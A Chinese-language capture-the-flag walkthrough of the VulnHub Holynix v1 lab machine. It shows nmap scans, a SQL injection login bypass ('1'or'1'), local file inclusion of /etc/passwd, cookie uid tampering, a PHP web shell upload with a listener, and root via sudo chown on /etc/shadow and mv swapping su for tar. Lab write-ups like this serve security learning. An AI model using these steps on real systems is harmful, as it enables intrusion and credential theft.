---
title: Vulnhub-Holynix：v1
published: 2025-03-09
tags: [Vulnhub]
category: 靶机
draft: false
---

# Holynix：v1

> [https://www.vulnhub.com/entry/holynix-v1,20/](https://www.vulnhub.com/entry/holynix-v1,20/)
> 

## 主机发现端口扫描

1. 探测存活主机，`153`为靶机
    
    ```php
    nmap -sP 192.168.75.0/24      
    //                      
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-25 19:09 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00026s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00026s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.153
    Host is up (0.0016s latency).
    MAC Address: 00:0C:29:BC:05:DE (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.0013s latency).
    MAC Address: 00:50:56:FB:E7:F4 (VMware)
    Nmap scan report for 192.168.75.151
    Host is up.
    
    ```
    
2. 扫描主机所有端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.153     
    //    
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-25 19:10 CST
    Nmap scan report for 192.168.75.153
    Host is up (0.00054s latency).
    Not shown: 65534 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    80/tcp open  http
    MAC Address: 00:0C:29:BC:05:DE (VMware)
    ```
    
3. 扫描服务版本及系统版本
    
    ```php
    nmap -sT -sV -O -p80 192.168.75.153    
    //   
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-25 19:11 CST
    Nmap scan report for 192.168.75.153
    Host is up (0.0012s latency).
    
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
    MAC Address: 00:0C:29:BC:05:DE (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6
    OS details: Linux 2.6.24 - 2.6.25
    Network Distance: 1 hop
    ```
    
4. 扫描漏洞
    
    ```sql
    nmap -script=vuln -p80 192.168.75.153    
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-25 19:12 CST
    Nmap scan report for 192.168.75.153
    Host is up (0.00059s latency).
    
    PORT   STATE SERVICE
    80/tcp open  http
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.153
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://192.168.75.153:80/?page=login.php
    |     Form id: 
    |     Form action: /index.php?page=login.php
    |     
    |     Path: http://192.168.75.153:80/index.php?page=login.php
    |     Form id: 
    |_    Form action: /index.php?page=login.php
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_      http://ha.ckers.org/slowloris/
    |_http-trace: TRACE is enabled
    | http-sql-injection: 
    |   Possible sqli for queries:
    |     http://192.168.75.153:80/?page=login.php%27%20OR%20sqlspider
    |     http://192.168.75.153:80/?page=login.php%27%20OR%20sqlspider
    |     http://192.168.75.153:80/index.php?page=login.php%27%20OR%20sqlspider
    |     http://192.168.75.153:80/?page=login.php%27%20OR%20sqlspider
    |     http://192.168.75.153:80/index.php?page=login.php%27%20OR%20sqlspider
    |_    http://192.168.75.153:80/?page=login.php%27%20OR%20sqlspider
    | http-enum: 
    |   /login.php: Possible admin folder
    |   /login/: Login page
    |   /home/: Potentially interesting folder
    |   /icons/: Potentially interesting folder w/ directory listing
    |   /img/: Potentially interesting folder
    |   /index/: Potentially interesting folder
    |   /misc/: Potentially interesting folder
    |   /transfer/: Potentially interesting folder
    |_  /upload/: Potentially interesting folder
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    MAC Address: 00:0C:29:BC:05:DE (VMware)
    ```
    
    一些页面可能存在`sql`注入以及`csrf` ，和一些让人感兴趣的目录
    

## web渗透

1. `Login`页面可能存在`sql`注入
    
    尝试后`name`框不存在注入，`password`框存在注入
    
    使用万能密码`1'or'1` 进入后台
    
2. 进入后台用户是`alamo` 
    
    看到有`upload`，尝试上传`shell`，显示该用户不允许上传文件
    
    `security`页面存在本文件包含，是个下拉选项框，可以修改属性达到包含本地目录，因为他的属性就是路径，修改为`/etc/passwd`
    
    ```sql
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    bin:x:2:2:bin:/bin:/bin/sh
    sys:x:3:3:sys:/dev:/bin/sh
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/bin/sh
    man:x:6:12:man:/var/cache/man:/bin/sh
    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
    mail:x:8:8:mail:/var/mail:/bin/sh
    news:x:9:9:news:/var/spool/news:/bin/sh
    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
    proxy:x:13:13:proxy:/bin:/bin/sh
    www-data:x:33:33:www-data:/var/www:/bin/sh
    backup:x:34:34:backup:/var/backups:/bin/sh
    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
    dhcp:x:101:102::/nonexistent:/bin/false
    syslog:x:102:103::/home/syslog:/bin/false
    klog:x:103:104::/home/klog:/bin/false
    sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
    mysql:x:105:114:MySQL Server,,,:/var/lib/mysql:/bin/false
    alamo:x:1000:115::/home/alamo:/bin/bash
    etenenbaum:x:1001:100::/home/etenenbaum:/bin/bash
    gmckinnon:x:1002:100::/home/gmckinnon:/bin/bash
    hreiser:x:1003:50::/home/hreiser:/bin/bash
    jdraper:x:1004:100::/home/jdraper:/bin/bash
    jjames:x:1005:50::/home/jjames:/bin/bash
    jljohansen:x:1006:115::/home/jljohansen:/bin/bash
    ltorvalds:x:1007:113::/home/ltorvalds:/bin/bash
    kpoulsen:x:1008:100::/home/kpoulsen:/bin/bash
    mrbutler:x:1009:50::/home/mrbutler:/bin/bash
    rtmorris:x:1010:100::/home/rtmorris:/bin/bash
    ```
    
3. 抓包查看，发现`cookie`设置当前`uid=1`，尝试修改`cookie`的`uid=2`，切换用户成功，切换到了`etenenbaum` ，尝试上传`shell`文件(shell文件使用`/usr/shar/lau../php`里面的，我自己上传的`shell`有问题)
    
    ![image.png](image%2017.png)
    
    上传成功，因为标题显示`home`目录`upload`，所以存放在`/~etenenbaum` 
    
    打开文件发现失败，可能是权限不够，我们勾选自动解压看看是否能执行
    
    将文件使用gizp压缩后上传，在访问家目录，发现存在shell文件了
    
    ![image.png](image%2018.png)
    
    点开始空白页，就表示可以执行，应该是两种方式上传后的权限不一样
    
    ps：假如压缩包上传不了，抓包将`MIME`的`x-gzip`改为`gizp`就行，可以文件包含漏洞包含`transfer.php`代码审计
    
4. `kali`监听`1234`端口，然后访问`shell`文件，获得shell

## 提权

1. 查看权限
    
    ```sql
    www-data@holynix:/$ whoami 
    www-data
    //
    www-data@holynix:/$ uname -a
    Linux holynix 2.6.24-26-server #1 SMP Tue Dec 1 19:19:20 UTC 2009 i686 GNU/Linux
    //
    www-data@holynix:/$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    //
    www-data@holynix:/$ sudo -l
    User www-data may run the following commands on this host:
        (root) NOPASSWD: /bin/chown
        (root) NOPASSWD: /bin/chgrp
        (root) NOPASSWD: /bin/tar
        (root) NOPASSWD: /bin/mv
    ```
    
    好几条存在sudo不用密码的，可能可以利用
    
2. mv可以干很多事
    - 改`shadow`所属组
        
        ```sql
        www-data@holynix:/home$ sudo chown www-data /etc/shadow
        
        ```
        
        然后使用`john`破解
        
    - 将`/bin/su`替换成`/bin/tar`那么我们就拥有`root shell`了
        
        ```sql
        www-data@holynix:/home$ sudo mv /bin/tar /bin/tar.b
        www-data@holynix:/home$ sudo mv /bin/su /bin/tar
        www-data@holynix:/home$ sudo /bin/tar
        root@holynix:/home# 
        ```